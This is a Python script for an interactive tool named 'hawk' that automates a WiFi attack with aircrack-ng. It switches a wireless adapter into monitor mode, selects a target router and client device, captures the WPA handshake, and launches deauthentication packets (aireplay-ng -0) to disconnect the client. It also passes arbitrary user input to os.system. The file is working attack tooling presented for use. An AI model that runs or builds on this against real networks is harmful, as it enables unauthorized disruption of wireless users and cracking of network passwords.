import os
import subprocess
import json
import time

from target import Target

target=Target()
os.environ['XDG_RUNTIME_DIR'] = '/tmp/runtime-root'

COMMANDS = {
    'help' : 'Shows this help message',
    'exit' : 'Exits this script',
    'terminal' : 'Executes terminal command',
    'monitor' : 'Executes getting wlan interface, switch to a monitoring mode',
    'craft' : 'Use sudo airmon-ng manually, filter with \'a\' key for \'sta only\' and copy a line of a target',
    'start' : 'monitor + craft'
        }

def load_config(file_path):
    with open(file_path,'r') as config_file:
            config_data=json.load(config_file)
            print('\nloading configuration ...\n-----')
            for line in config_data:
                print(line + ':\t' + config_data.get(line))
            print('-----\n')
            return config_data

def main(config_param):

    while True:
        user_input = input("hawk$  ")
        if user_input.lower() == 'exit':
            break

        elif user_input.lower() == 'help':
            print('Available commands: ')
            for command in COMMANDS:
                    print(f" {command} - {COMMANDS[command]}")

        elif user_input.lower() == 'terminal':
            user_input = input("hawk - terminal$ ")
            os.system(user_input)

        elif user_input.lower() == 'monitor':
            if get_interface(config_param):
                start_monitoring_mode()

        elif user_input.lower() == 'craft':

            if not target.interface:
                get_interface(config_param)
            if get_data():
                print_data(config_param)
                prepare_output_folder(config_param)
            else:
                print('\nError: interface not found\n# run \'monitor\' command first\n')

        elif user_input.lower() == 'start':
            if get_interface(config_param):
                start_monitoring_mode()
                if get_data():
                    print_data(config_param)
                    prepare_output_folder(config_param)

def get_interface(config_param):

    count = 0
    tries = 10
    while True:
        print(f'\nSearching for {config_param.get('ap_dongle')} ...')
        airmon_output = subprocess.run(['sudo', 'airmon-ng'], capture_output=True, text=True)
        result = airmon_output.stdout
        lines = result.split('\n')
        adapters_info = [line for line in lines if config_param.get('ap_dongle') in line]

        if not adapters_info:
            count += 1
            print(f'Error: not found dongle {config_param.get('ap_dongle')}\nretrying [{count}/{tries}] ...\n')
            time.sleep(4)
            if count >= tries:
                print(f'Error: not found dongle {config_param.get('ap_dongle')}\n# check dongle, drivers and VM settings\n')
                return 0
        else:
            target.interface = adapters_info[0].split()[1]
            print(f'Success! Found interface: {target.interface}')
            return 1

def start_monitoring_mode():
    print(f'\nStarting monitoring mode ...')
    commands = [
        f'sudo airmon-ng check kill',
        f'sudo ifconfig {target.interface} down',
        f'sudo iwconfig {target.interface} mode monitor',
        f'sudo ifconfig {target.interface} up'
    ]
    for command in commands:
        print(f'hawk$ {command}')
        os.system(command)
        time.sleep(2)
    
def get_data():

    print(f'\nhawk$ sudo airodump-ng {target.interface}')
    print('# copy the line of the selected target\n# filter with \'a\' key for \'sta only\' to see paired devices\n# type \'fail\' if the device has problem, reinsert, and try again\n')
    subprocess.run(['qterminal', '-e', f'bash -c "sudo airodump-ng {target.interface}; exec bash"'])

    user_input=input()

    if user_input=='fail':
        return 0

    macs=user_input.split()
    target.router_mac=macs[0]
    target.device_mac=macs[1]

    print(f'\nhawk$ : sudo airodump-ng {target.interface} --bssid {target.router_mac}')
    print('# copy first line to get router details\n')
    subprocess.run(['qterminal', '-e', f'bash -c "sudo airodump-ng {target.interface} --bssid {target.router_mac}; exec bash"'])
    user_input=input()
    target.router_ssid=user_input.split()[10]
    target.channel=user_input.split()[5]
    return 1

def prepare_output_folder(config_param):
    folder=config_param.get('cap_dir')+f'/{target.router_ssid}'
    print(f'\ncreating folder for cap files: {folder}')
    os.makedirs(folder, exist_ok=True)

def print_data(config_param):
    print('\n--- SUCCESS - All data collected ---')
    print(f'interface: {target.interface}')
    print(f'router SSID: {target.router_ssid}')
    print(f'router MAC: {target.router_mac}')
    print(f'channel: {target.channel}')
    print(f'device MAC: {target.device_mac}')

    print('\n--- crafting commands ---')
    print('\n-- monitor handshake --')
    print(f'sudo airodump-ng -c {target.channel} --bssid {target.router_mac} -w {config_param.get('cap_dir')}/{target.router_ssid}/{target.router_ssid} {target.interface}')

    print('\n-- send deauth packets --')
    print(f'sudo aireplay-ng -0 1 -a {target.router_mac} -c {target.device_mac} {target.interface}')

    subprocess.Popen(['qterminal', '-e', f'bash -c "sudo airodump-ng -c {target.channel} --bssid {target.router_mac} -w {config_param.get('cap_dir')}/{target.router_ssid}/{target.router_ssid} {target.interface}; exec bash"'])
    subprocess.Popen(['qterminal', '-e', f'bash -c "sudo aireplay-ng -0 1 -a {target.router_mac} -c {target.device_mac} {target.interface}; exec bash"'])

if __name__=='__main__':
    config=load_config('config.json')
    main(config)